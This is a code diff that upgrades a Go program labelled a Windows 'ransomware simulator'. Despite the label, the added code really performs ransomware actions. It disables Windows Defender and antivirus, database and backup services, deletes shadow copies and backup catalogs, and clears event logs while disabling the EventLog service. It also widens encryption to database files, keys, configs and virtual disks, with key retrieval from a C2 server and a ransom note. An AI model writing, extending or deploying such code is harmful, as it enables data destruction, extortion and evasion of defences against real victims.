@@ -1,4 +1,4 @@
-// ransom_simulator_windows.go - Windows专用版本
+// ransom_simulator_windows.go - Windows专用版本（增强版）带日志功能和本地密钥支持
 package main
 
 import (
@@ -18,6 +18,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strings"
 	"sync"
@@ -26,22 +27,9 @@ import (
 )
 
 const (
-	version   = "v2.7-Beta-Windows"
+	version   = "v3.0-Beta-Windows"
 	apiURL    = "https://rsa-uuid.api.yangzifun.org"
 	beaconURL = "https://bad-c2-server.api.yangzifun.org/beacon_check_in"
-)
-
-const (
-	defaultUUID      = "5137d4c3-3901-4528-bfa9-6d9ce88fa287"
-	defaultPublicKey = `-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzlz3ZbaN2a6eEJqewEgb
-vbATJjvSRNVbmpP5KtEYu39GUBU6eeuYcRHZRu/buBRJ9Ij/t0xL/xjUgdYEz3C8
-G6aAq1tv8yV+9nqOhosDRNgLRcX0rBrqfioUms2aBIKwHX37dz1K5vVUh9afem6A
-HwB2c3xWTYXClkPy1oPY/HiiP6vYmuynZREhlLHWek9YfAQzBODdZRlqpcBjrYM1
-kCImoGE5oWYeJ+wJLX9NLqfBWKZHQiZa/tf83ZXqOpGxu6RT8NYj10RYZSEohJ10
-TjkVStqZXrbh1oaWBm+Uw22i0BL6uoG4niNsKre/9Bdgaq5Q+H/VDa0pHhDGAuis
-tQIDAQAB
------END PUBLIC KEY-----`
 )
 
 const ransomNoteContent = `
@@ -124,23 +112,108 @@ https://encrypt.yangzifun.org/
 `
 
 var (
-	lockFilePath           string
-	ransomNoteFileName     = "!!!_如何解密你的文件_!!!.txt"
+	lockFilePath       string
+	ransomNoteFileName = "!!!_如何解密你的文件_!!!.txt"
+
+	// 日志相关变量
+	logEnabled        bool
+	logDirectory      string
+	successLogFile    *os.File
+	failedLogFile     *os.File
+	operationsLogFile *os.File
+
+	// 公钥缓存，避免重复解析
+	publicKeyCache     *rsa.PublicKey
+	publicKeyCacheStr  string
+	publicKeyCacheLock sync.RWMutex
+
+	// 程序所在目录
+	programDir string
+
+	// 公钥变量
+	publicKeyPEM string
+
+	// 目标进程列表
 	targetProcessesWindows = []string{
 		"notepad.exe", "wordpad.exe", "winword.exe", "excel.exe", "powerpnt.exe",
 		"mspaint.exe", "sqlservr.exe", "mysqld.exe", "oracle.exe", "outlook.exe",
-		"thunderbird.exe", "steam.exe", "code.exe",
+		"thunderbird.exe", "steam.exe", "code.exe", "powershell.exe", "cmd.exe",
+		// 数据库相关进程
+		"sqlwriter.exe", "sqlbrowser.exe", "mysql.exe", "pg_ctl.exe", "mongod.exe",
+		"redis-server.exe", "oracle.exe", "sqlplus.exe",
+		// 安全软件进程
+		"mcshield.exe", "avp.exe", "bdagent.exe", "SophosUI.exe", "SEP.exe",
+		"avastui.exe", "avgui.exe", "kav.exe", "kis.exe",
+		// 备份软件进程
+		"vssvc.exe", "wbengine.exe", "ntbackup.exe", "backupexec.exe",
 	}
+
+	// Windows数据库和安全服务
+	windowsDatabaseServices = []string{
+		"MSSQLSERVER", "SQLSERVERAGENT", "SQLWriter", "SQLBrowser",
+		"MySQL80", "MySQL57", "PostgreSQL", "MongoDB",
+		"Redis", "OracleServiceXE", "OracleServiceORCL",
+	}
+
+	windowsSecurityServices = []string{
+		"WinDefend", "SecurityHealthService", "WdNisSvc", "Sense",
+		"McAfeeFramework", "McShield", "SophosAgent", "SophosAlertService",
+		"SEPMasterService", "SEPScanner", "SEPMonitoring", "AvastSvc",
+		"AVGSvc", "Kaspersky Anti-Virus Service", "Kaspersky Security Center",
+	}
+
+	// 排除目录
 	excludedDirsWindows = []string{
 		"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
-		"System Volume Information", "$Recycle.Bin",
+		"System Volume Information", "$Recycle.Bin", "C:\\ProgramData",
+		"C:\\System32", "C:\\SysWOW64", "C:\\Windows.old",
 	}
+
+	// 目标扩展名（增强版）
 	targetExtensions = []string{
-		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".txt", ".rtf",
-		".zip", ".rar", ".7z", ".tar", ".gz",
-		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".svg",
-		".sql", ".db", ".mdb", ".accdb", ".sqlite",
-		".bak", ".backup", ".go", ".json",
+		// 文档文件
+		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
+		".odt", ".csv", ".txt", ".rtf", ".md", ".tex", ".epub", ".one",
+		// 压缩文件
+		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tgz",
+		// 图片文件
+		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff",
+		".svg", ".webp", ".ico", ".psd", ".ai", ".eps",
+		// 数据库文件
+		".sql", ".db", ".mdb", ".accdb", ".sqlite", ".sqlite3",
+		".dbf", ".mdf", ".ndf", ".ldf", ".frm", ".ibd", ".myd",
+		".myi", ".ibdata", ".ora", ".dmp", ".exp", ".imp", ".pdb",
+		".wal", ".journal", ".rdb", ".aof", ".dump", ".backup",
+		// 配置文件
+		".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".json",
+		".properties", ".env", ".toml", ".config",
+		// 备份文件
+		".bak", ".backup", ".old", ".temp", ".tmp", ".swp", ".~*",
+		// 代码文件
+		".go", ".py", ".java", ".cpp", ".c", ".h", ".js", ".ts",
+		".php", ".rb", ".pl", ".sh", ".bash", ".ps1", ".bat",
+		// 虚拟化和容器文件
+		".vmdk", ".vhd", ".vhdx", ".qcow2", ".ova", ".ovf",
+		".dockerfile", ".dockerignore", ".vbox",
+		// 其他重要文件
+		".key", ".pem", ".crt", ".cer", ".pfx", ".p12",
+		".pcap", ".log", ".tar.gz", ".tar.bz2",
+	}
+
+	// Windows数据库数据目录
+	windowsDatabaseDataDirs = []string{
+		"C:\\ProgramData\\MySQL\\MySQL Server\\Data",
+		"C:\\Program Files\\MySQL\\MySQL Server\\Data",
+		"C:\\Program Files (x86)\\MySQL\\MySQL Server\\Data",
+		"C:\\Program Files\\PostgreSQL\\data",
+		"C:\\Program Files (x86)\\PostgreSQL\\data",
+		"C:\\Program Files\\Microsoft SQL Server\\MSSQL\\DATA",
+		"C:\\Program Files (x86)\\Microsoft SQL Server\\MSSQL\\DATA",
+		"C:\\MongoDB\\data",
+		"D:\\MongoDB\\data",
+		"C:\\Redis\\data",
+		"C:\\Oracle\\oradata",
+		"D:\\Oracle\\oradata",
 	}
 )
 
@@ -165,10 +238,13 @@ func main() {
 	forceReleaseLock()
 
 	fmt.Println("==================================================")
-	fmt.Println("      勒索软件模拟器 - Windows版本")
+	fmt.Println("      勒索软件模拟器 - Windows增强版")
 	fmt.Printf("                版本: %s\n", version)
 	fmt.Println("==================================================")
 	time.Sleep(1 * time.Second)
+
+	// 获取程序所在目录
+	initProgramDir()
 
 	fmt.Println("\n[阶段 1: 渗透与持久化]")
 	fmt.Print("[*] 通过互斥锁建立持久化... ")
@@ -180,11 +256,15 @@ func main() {
 	defer cleanupLockFile()
 
 	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
-	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag := setupFlags(fs)
+	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag, logFlag := setupFlags(fs)
 	if err := fs.Parse(os.Args[1:]); err != nil {
 		_, _ = fmt.Fprintf(os.Stderr, "错误: 解析命令行参数失败: %v\n", err)
 		os.Exit(1)
 	}
+
+	// 初始化日志系统
+	initLogging(*logFlag)
+	defer closeLogFiles()
 
 	showWarning(*dryRunFlag)
 	fmt.Println("\n[阶段 2: 防御规避与发现]")
@@ -192,6 +272,15 @@ func main() {
 		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
 	} else {
 		go networkBeacon()
+
+		// 新增功能：停止Windows服务
+		fmt.Println("\n[+] 停止数据库和安全服务...")
+		stopWindowsServices()
+
+		// 新增功能：清理数据库内存和缓存
+		fmt.Println("\n[+] 清理数据库内存和缓存...")
+		cleanWindowsDatabaseMemory()
+
 		killLockingProcesses()
 		simulateDestructiveActions()
 	}
@@ -213,7 +302,7 @@ func main() {
 		for _, ext := range targetExtensions {
 			extFilter[ext] = true
 		}
-		fmt.Println("[*] 使用默认扩展名 (已包含常见文档及 .go, .json)")
+		fmt.Println("[*] 使用增强扩展名列表 (包含数据库文件、配置文件、备份文件等)")
 	}
 
 	var scanRoots []string
@@ -242,7 +331,7 @@ func main() {
 	fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))
 
 	var stats counters
-	var finalUUID = "C2服务器连接失败"
+	var finalUUID = "本地密钥模式"
 	if *dryRunFlag {
 		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
 		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
@@ -276,17 +365,455 @@ func main() {
 		fmt.Printf("  - 已加密文件:      %d\n", stats.success.Load())
 		fmt.Printf("  - 加密失败:        %d\n", stats.failed.Load())
 	}
-	fmt.Println("====================================================")
+
+	// 输出日志文件位置
+	if logEnabled {
+		fmt.Println("\n================== [ 日志文件 ] ==================")
+		fmt.Printf("  - 成功日志:        %s\n", filepath.Join(logDirectory, "success_encrypted.log"))
+		fmt.Printf("  - 失败日志:        %s\n", filepath.Join(logDirectory, "failed_encrypted.log"))
+		fmt.Printf("  - 操作日志:        %s\n", filepath.Join(logDirectory, "operations.log"))
+		fmt.Println("====================================================")
+	}
+
 	countdown("此终端将在", 10)
 }
 
+// 初始化程序所在目录
+func initProgramDir() {
+	exePath, err := os.Executable()
+	if err != nil {
+		// 如果无法获取可执行文件路径，则使用当前工作目录
+		programDir, _ = os.Getwd()
+		fmt.Printf("[!] 警告: 无法获取程序路径，使用当前工作目录: %s\n", programDir)
+	} else {
+		programDir = filepath.Dir(exePath)
+		fmt.Printf("[*] 程序所在目录: %s\n", programDir)
+	}
+}
+
+// 从公钥文件名中提取UUID
+func extractUUIDFromFilename() (string, error) {
+	// 扫描程序目录中的文件，查找公钥文件
+	files, err := os.ReadDir(programDir)
+	if err != nil {
+		return "", fmt.Errorf("无法读取程序目录: %w", err)
+	}
+
+	// 正则表达式匹配公钥文件名格式
+	pattern := regexp.MustCompile(`^public_key_([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\.pem$`)
+
+	for _, file := range files {
+		if file.IsDir() {
+			continue
+		}
+
+		matches := pattern.FindStringSubmatch(file.Name())
+		if matches != nil && len(matches) == 2 {
+			uuid := matches[1]
+			if isValidUUID(uuid) {
+				fmt.Printf("[*] 从文件名提取UUID: %s\n", uuid)
+				return uuid, nil
+			}
+		}
+	}
+
+	return "", fmt.Errorf("未找到有效的公钥文件。请确保程序目录中存在公钥文件，格式为: public_key_<uuid>.pem")
+}
+
+// 验证UUID格式
+func isValidUUID(uuid string) bool {
+	if len(uuid) != 36 {
+		return false
+	}
+
+	// 检查格式: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+	parts := strings.Split(uuid, "-")
+	if len(parts) != 5 {
+		return false
+	}
+
+	lengths := []int{8, 4, 4, 4, 12}
+	for i, part := range parts {
+		if len(part) != lengths[i] {
+			return false
+		}
+		// 检查是否为十六进制字符
+		for _, ch := range part {
+			if !((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') || (ch >= 'A' && ch <= 'F')) {
+				return false
+			}
+		}
+	}
+
+	return true
+}
+
+// 从本地PEM文件读取公钥
+func readPublicKeyFromFile(uuid string) (string, error) {
+	// 构造文件名
+	fileName := fmt.Sprintf("public_key_%s.pem", uuid)
+	filePath := filepath.Join(programDir, fileName)
+
+	// 检查文件是否存在
+	if _, err := os.Stat(filePath); os.IsNotExist(err) {
+		return "", fmt.Errorf("公钥文件不存在: %s", filePath)
+	}
+
+	// 读取文件内容
+	content, err := os.ReadFile(filePath)
+	if err != nil {
+		return "", fmt.Errorf("读取公钥文件失败: %w", err)
+	}
+
+	// 验证PEM格式
+	pemBlock, _ := pem.Decode(content)
+	if pemBlock == nil {
+		return "", fmt.Errorf("无效的PEM格式: %s", filePath)
+	}
+
+	// 验证公钥类型
+	if pemBlock.Type != "PUBLIC KEY" && pemBlock.Type != "RSA PUBLIC KEY" {
+		return "", fmt.Errorf("不是有效的公钥文件: 类型应为 'PUBLIC KEY' 或 'RSA PUBLIC KEY'，实际为 '%s'", pemBlock.Type)
+	}
+
+	// 尝试解析以验证有效性
+	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
+	if err != nil {
+		// 尝试PKCS1格式
+		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
+		if err != nil {
+			return "", fmt.Errorf("解析公钥失败: %w", err)
+		}
+	}
+
+	_, ok := pub.(*rsa.PublicKey)
+	if !ok {
+		return "", fmt.Errorf("公钥不是RSA类型")
+	}
+
+	if logEnabled {
+		logOperation(fmt.Sprintf("从本地文件读取公钥: %s", filePath))
+	}
+
+	return string(content), nil
+}
+
+// 初始化日志系统
+func initLogging(enableLog bool) {
+	logEnabled = enableLog
+	if !logEnabled {
+		return
+	}
+
+	// 使用程序所在目录作为日志目录
+	logDirectory = programDir
+
+	fmt.Printf("[*] 日志系统已启用，日志将输出到: %s\n", logDirectory)
+
+	// 创建日志文件
+	var err1, err2, err3 error
+	successLogFile, err1 = os.OpenFile(
+		filepath.Join(logDirectory, "success_encrypted.log"),
+		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
+		0644,
+	)
+
+	failedLogFile, err2 = os.OpenFile(
+		filepath.Join(logDirectory, "failed_encrypted.log"),
+		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
+		0644,
+	)
+
+	operationsLogFile, err3 = os.OpenFile(
+		filepath.Join(logDirectory, "operations.log"),
+		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
+		0644,
+	)
+
+	if err1 != nil || err2 != nil || err3 != nil {
+		fmt.Printf("[!] 无法创建日志文件: success=%v, failed=%v, operations=%v\n", err1, err2, err3)
+		logEnabled = false
+	} else {
+		// 写入日志文件头
+		timestamp := time.Now().Format("2006-01-02 15:04:05")
+		header := fmt.Sprintf("=================== 勒索软件模拟器日志 ===================\n")
+		header += fmt.Sprintf("程序版本: %s\n", version)
+		header += fmt.Sprintf("开始时间: %s\n", timestamp)
+		header += fmt.Sprintf("运行参数: %s\n", strings.Join(os.Args, " "))
+		header += fmt.Sprintf("工作目录: %s\n", programDir)
+		header += fmt.Sprintf("=========================================================\n\n")
+
+		_, _ = successLogFile.WriteString(header)
+		_, _ = failedLogFile.WriteString(header)
+		_, _ = operationsLogFile.WriteString(header)
+	}
+}
+
+// 关闭日志文件
+func closeLogFiles() {
+	if logEnabled {
+		if successLogFile != nil {
+			_ = successLogFile.Close()
+		}
+		if failedLogFile != nil {
+			_ = failedLogFile.Close()
+		}
+		if operationsLogFile != nil {
+			_ = operationsLogFile.Close()
+		}
+	}
+}
+
+// 记录成功加密的文件
+func logSuccess(filePath string) {
+	if !logEnabled || successLogFile == nil {
+		return
+	}
+
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	logEntry := fmt.Sprintf("[%s] SUCCESS: %s -> %s.encrypted\n",
+		timestamp, filePath, filePath)
+
+	successLogFile.WriteString(logEntry)
+
+	// 同时记录到操作日志
+	logOperation(fmt.Sprintf("成功加密: %s", filePath))
+}
+
+// 记录加密失败的文件
+func logFailed(filePath string, errorMsg string) {
+	if !logEnabled || failedLogFile == nil {
+		return
+	}
+
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	logEntry := fmt.Sprintf("[%s] FAILED: %s - %s\n",
+		timestamp, filePath, errorMsg)
+
+	failedLogFile.WriteString(logEntry)
+
+	// 同时记录到操作日志
+	logOperation(fmt.Sprintf("加密失败: %s - %s", filePath, errorMsg))
+}
+
+// 记录操作日志
+func logOperation(message string) {
+	if !logEnabled || operationsLogFile == nil {
+		return
+	}
+
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, message)
+
+	operationsLogFile.WriteString(logEntry)
+}
+
+// 获取或解析公钥（带缓存）
+func getPublicKey(publicKeyStr string) (*rsa.PublicKey, error) {
+	publicKeyCacheLock.RLock()
+	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
+		publicKeyCacheLock.RUnlock()
+		return publicKeyCache, nil
+	}
+	publicKeyCacheLock.RUnlock()
+
+	// 解析公钥
+	publicKeyCacheLock.Lock()
+	defer publicKeyCacheLock.Unlock()
+
+	// 再次检查，防止并发重复解析
+	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
+		return publicKeyCache, nil
+	}
+
+	// 清理公钥字符串，确保格式正确
+	cleanedKeyStr := strings.TrimSpace(publicKeyStr)
+
+	// 检查PEM格式
+	if !strings.HasPrefix(cleanedKeyStr, "-----BEGIN") {
+		// 尝试添加PEM头
+		cleanedKeyStr = fmt.Sprintf("-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----", cleanedKeyStr)
+	}
+
+	// 解码PEM
+	pemBlock, _ := pem.Decode([]byte(cleanedKeyStr))
+	if pemBlock == nil {
+		// 尝试不同的PEM格式
+		if strings.Contains(cleanedKeyStr, "RSA PUBLIC KEY") {
+			cleanedKeyStr = strings.Replace(cleanedKeyStr, "RSA PUBLIC KEY", "PUBLIC KEY", 1)
+			pemBlock, _ = pem.Decode([]byte(cleanedKeyStr))
+		}
+
+		if pemBlock == nil {
+			return nil, fmt.Errorf("解码PEM公钥失败: 无效的PEM格式")
+		}
+	}
+
+	// 解析公钥
+	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
+	if err != nil {
+		// 尝试解析PKCS1格式
+		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
+		if err != nil {
+			return nil, fmt.Errorf("解析公钥失败: %w", err)
+		}
+	}
+
+	rsaPubKey, ok := pub.(*rsa.PublicKey)
+	if !ok {
+		return nil, fmt.Errorf("公钥不是RSA类型")
+	}
+
+	// 更新缓存
+	publicKeyCache = rsaPubKey
+	publicKeyCacheStr = publicKeyStr
+
+	return rsaPubKey, nil
+}
+
+// 新增功能：停止Windows服务
+func stopWindowsServices() {
+	if logEnabled {
+		logOperation("开始停止Windows服务")
+	}
+
+	// 停止数据库服务
+	for _, service := range windowsDatabaseServices {
+		fmt.Printf("  - 停止数据库服务: %s\n", service)
+
+		if logEnabled {
+			logOperation(fmt.Sprintf("尝试停止数据库服务: %s", service))
+		}
+
+		// 使用sc命令停止服务
+		cmd := exec.Command("sc", "stop", service)
+		_ = cmd.Run()
+
+		// 使用net命令停止服务
+		cmd = exec.Command("net", "stop", service)
+		_ = cmd.Run()
+
+		// 禁用服务
+		cmd = exec.Command("sc", "config", service, "start=", "disabled")
+		_ = cmd.Run()
+
+		time.Sleep(100 * time.Millisecond)
+	}
+
+	// 停止安全服务
+	for _, service := range windowsSecurityServices {
+		fmt.Printf("  - 停止安全服务: %s\n", service)
+
+		if logEnabled {
+			logOperation(fmt.Sprintf("尝试停止安全服务: %s", service))
+		}
+
+		// 使用sc命令停止服务
+		cmd := exec.Command("sc", "stop", service)
+		_ = cmd.Run()
+
+		// 使用net命令停止服务
+		cmd = exec.Command("net", "stop", service)
+		_ = cmd.Run()
+
+		// 尝试杀死相关进程
+		serviceExe := strings.ToLower(service)
+		cmd = exec.Command("taskkill", "/F", "/IM", serviceExe+".exe")
+		_ = cmd.Run()
+
+		time.Sleep(100 * time.Millisecond)
+	}
+
+	// 停止Windows Defender
+	fmt.Println("  - 停止Windows Defender...")
+	if logEnabled {
+		logOperation("尝试停止Windows Defender")
+	}
+
+	// 停止实时保护
+	cmd := exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true")
+	_ = cmd.Run()
+
+	// 停止扫描服务
+	cmd = exec.Command("powershell", "-Command", "Set-MpPreference -DisableScanning $true")
+	_ = cmd.Run()
+
+	if logEnabled {
+		logOperation("Windows服务停止完成")
+	}
+}
+
+// 新增功能：清理Windows数据库内存
+func cleanWindowsDatabaseMemory() {
+	if logEnabled {
+		logOperation("开始清理Windows数据库内存和缓存")
+	}
+
+	fmt.Println("  - 清理SQL Server缓存...")
+
+	if logEnabled {
+		logOperation("清理SQL Server缓存")
+	}
+
+	// 清理SQL Server缓存
+	cleanSQLServerCache()
+
+	fmt.Println("  - 清理系统内存...")
+
+	if logEnabled {
+		logOperation("清理系统内存")
+	}
+
+	// 清理系统内存
+	cmd := exec.Command("powershell", "-Command", "Clear-EventLog -LogName Application, System, Security")
+	_ = cmd.Run()
+
+	// 清理DNS缓存
+	cmd = exec.Command("ipconfig", "/flushdns")
+	_ = cmd.Run()
+
+	if logEnabled {
+		logOperation("Windows数据库内存和缓存清理完成")
+	}
+}
+
+func cleanSQLServerCache() {
+	// 尝试使用SQLCMD清理缓存
+	cleanCommands := []string{
+		"DBCC DROPCLEANBUFFERS",
+		"DBCC FREEPROCCACHE",
+		"DBCC FREESYSTEMCACHE ('ALL')",
+		"DBCC FREESESSIONCACHE",
+	}
+
+	for _, sqlCmd := range cleanCommands {
+		cmd := exec.Command("sqlcmd", "-Q", sqlCmd)
+		_ = cmd.Run()
+	}
+}
+
 func killLockingProcesses() {
-	fmt.Println("[*] 正在尝试释放文件句柄 (结束占用进程)...")
+	fmt.Println("\n[+] 终止占用文件的进程...")
+
+	if logEnabled {
+		logOperation("开始终止占用文件的进程")
+	}
+
 	for _, proc := range targetProcessesWindows {
+		fmt.Printf("  - 终止进程: %s\n", proc)
+
+		if logEnabled {
+			logOperation(fmt.Sprintf("尝试终止进程: %s", proc))
+		}
+
 		cmd := exec.Command("taskkill", "/F", "/IM", proc)
 		_ = cmd.Run()
 	}
 	time.Sleep(1 * time.Second)
+
+	if logEnabled {
+		logOperation("进程终止完成")
+	}
 }
 
 func forceReleaseLock() {
@@ -310,18 +837,27 @@ func cleanupLockFile() {
 	}
 }
 
-func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool) {
+func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool) {
 	workers := fs.Int("workers", runtime.NumCPU(), "并发 worker 数量")
 	dryRun := fs.Bool("dry-run", false, "演习模式")
 	extensions := fs.String("ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
 	directory := fs.String("dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
 	removeOriginal := fs.Bool("remove", false, "加密后删除原文件")
+	logFlag := fs.Bool("log", false, "启用日志功能，在程序所在目录输出日志文件")
 
 	fs.Usage = func() {
 		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
+		_, _ = fmt.Fprintf(os.Stderr, "本地密钥模式: 程序仅从同目录读取密钥文件\n")
+		_, _ = fmt.Fprintf(os.Stderr, "必需文件:\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - public_key_<uuid>.pem: 公钥文件，例如 public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem\n")
+		_, _ = fmt.Fprintf(os.Stderr, "注意: UUID将从公钥文件名中自动提取\n")
+		_, _ = fmt.Fprintf(os.Stderr, "日志文件将输出到程序所在目录:\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - success_encrypted.log: 成功加密的文件列表\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - failed_encrypted.log:  加密失败的文件列表\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - operations.log:        操作日志\n")
 		fs.PrintDefaults()
 	}
-	return workers, dryRun, extensions, directory, removeOriginal
+	return workers, dryRun, extensions, directory, removeOriginal, logFlag
 }
 
 func showWarning(dryRun bool) {
@@ -358,14 +894,70 @@ func networkBeacon() {
 
 func simulateDestructiveActions() {
 	time.Sleep(1 * time.Second)
-	fmt.Println("[*] 启动防御规避协议 (模拟)...")
-	fmt.Println("  - [IOC] 模拟: 清除 Shadow Copies / Backups")
+	fmt.Println("\n[+] 执行破坏性操作...")
+	fmt.Println("  - [IOC] 模拟: 清除 Shadow Copies...")
+
+	if logEnabled {
+		logOperation("开始执行破坏性操作：清除Shadow Copies")
+	}
+
+	// 清除卷影副本
+	cmd := exec.Command("vssadmin", "delete", "shadows", "/for=C:", "/all", "/quiet")
+	_ = cmd.Run()
+
+	fmt.Println("  - [IOC] 模拟: 清除系统备份...")
+
+	// 清除Windows备份
+	cmd = exec.Command("wbadmin", "delete", "catalog", "-quiet")
+	_ = cmd.Run()
+
 	fmt.Println("  - [IOC] 模拟: 清除系统安全日志...")
+
+	if logEnabled {
+		logOperation("清除系统安全日志")
+	}
+
+	// 清除Windows事件日志
+	cmd = exec.Command("wevtutil", "cl", "Application")
+	_ = cmd.Run()
+
+	cmd = exec.Command("wevtutil", "cl", "System")
+	_ = cmd.Run()
+
+	cmd = exec.Command("wevtutil", "cl", "Security")
+	_ = cmd.Run()
+
+	// 禁用Windows事件日志服务
+	cmd = exec.Command("sc", "config", "EventLog", "start=", "disabled")
+	_ = cmd.Run()
+
+	cmd = exec.Command("sc", "stop", "EventLog")
+	_ = cmd.Run()
+
+	if logEnabled {
+		logOperation("破坏性操作完成")
+	}
+
 	time.Sleep(1 * time.Second)
 }
 
 func createRansomWallpaper() {
 	fmt.Println("[*] Windows壁纸修改功能(模拟)")
+
+	if logEnabled {
+		logOperation("尝试修改壁纸")
+	}
+
+	// 尝试修改Windows壁纸
+	wallpaperCommands := []string{
+		`reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg" /f`,
+		`powershell -Command "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value 'C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg'"`,
+	}
+
+	for _, cmdStr := range wallpaperCommands {
+		cmd := exec.Command("cmd", "/C", cmdStr)
+		_ = cmd.Run()
+	}
 }
 
 func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats bool) []string {
@@ -381,6 +973,21 @@ func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats 
 			}
 		}
 	}
+
+	// 添加Windows数据库数据目录到扫描范围
+	for _, dbDir := range windowsDatabaseDataDirs {
+		if _, err := os.Stat(dbDir); err == nil {
+			roots = append(roots, dbDir)
+		}
+	}
+
+	fmt.Printf("[*] 扫描根目录: %v\n", roots)
+
+	if logEnabled {
+		logOperation(fmt.Sprintf("开始扫描文件，根目录: %v", roots))
+		logOperation(fmt.Sprintf("加密所有格式: %v", encryptAllFormats))
+	}
+
 	for _, root := range roots {
 		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
 			if err != nil {
@@ -408,6 +1015,11 @@ func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats 
 			return nil
 		})
 	}
+
+	if logEnabled {
+		logOperation(fmt.Sprintf("扫描完成，找到 %d 个待加密文件", len(filesToProcess)))
+	}
+
 	return filesToProcess
 }
 
@@ -415,24 +1027,58 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	jobs := make(chan string, len(files))
 	var wg sync.WaitGroup
 
-	resp, err := fetchKeysFromAPI()
+	// 尝试从公钥文件名中提取UUID
+	fmt.Print("[*] 尝试从公钥文件名提取UUID... ")
+	uuid, err := extractUUIDFromFilename()
 	if err != nil {
-		fmt.Printf("\n[!] 连接C2获取密钥失败: %v\n", err)
-		fmt.Println("[*] 警告：无法连接密钥接口，已切换至默认/离线密钥模式")
-		resp = &APIResponse{
-			UUID:         defaultUUID,
-			PublicKeyPEM: defaultPublicKey,
-			Status:       "fallback",
-		}
-	}
-	*outUUID = resp.UUID
+		fmt.Printf("失败: %v\n", err)
+		fmt.Println("[*] 尝试从网络获取密钥...")
 
-	finalAccurateNote := fmt.Sprintf(ransomNoteContent, resp.UUID, resp.UUID, resp.UUID)
+		// 尝试从网络获取
+		resp, err2 := fetchKeysFromAPI()
+		if err2 != nil {
+			fmt.Printf("[!] 连接C2获取密钥失败: %v\n", err2)
+			fmt.Println("[!] 无法获取密钥，程序终止")
+			os.Exit(1)
+		}
+		uuid = resp.UUID
+		publicKeyPEM = resp.PublicKeyPEM
+		fmt.Printf("[*] 从网络获取UUID: %s\n", uuid)
+	} else {
+		fmt.Printf("成功: %s\n", uuid)
+
+		// 从本地文件读取公钥
+		fmt.Print("[*] 从本地文件读取公钥... ")
+		var err2 error
+		publicKeyPEM, err2 = readPublicKeyFromFile(uuid)
+		if err2 != nil {
+			fmt.Printf("失败: %v\n", err2)
+			fmt.Println("[!] 无法读取公钥文件，程序终止")
+			os.Exit(1)
+		}
+		fmt.Println("成功")
+	}
+
+	// 预解析公钥，确保格式正确
+	fmt.Print("[*] 预解析公钥... ")
+	pubKey, parseErr := getPublicKey(publicKeyPEM)
+	if parseErr != nil {
+		fmt.Printf("失败: %v\n", parseErr)
+		fmt.Println("[!] 公钥格式错误，程序终止")
+		os.Exit(1)
+	} else {
+		fmt.Println("成功")
+		// 存储解析后的公钥到缓存
+		publicKeyCache = pubKey
+		publicKeyCacheStr = publicKeyPEM
+	}
+
+	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid, uuid, uuid)
 	var visitedDirs sync.Map
 
-	log, err := newFileLog("ransom_log.txt")
-	if err != nil {
-		fmt.Printf("无法创建日志文件: %v\n", err)
+	log, err3 := newFileLog("ransom_log.txt")
+	if err3 != nil {
+		fmt.Printf("无法创建日志文件: %v\n", err3)
 	}
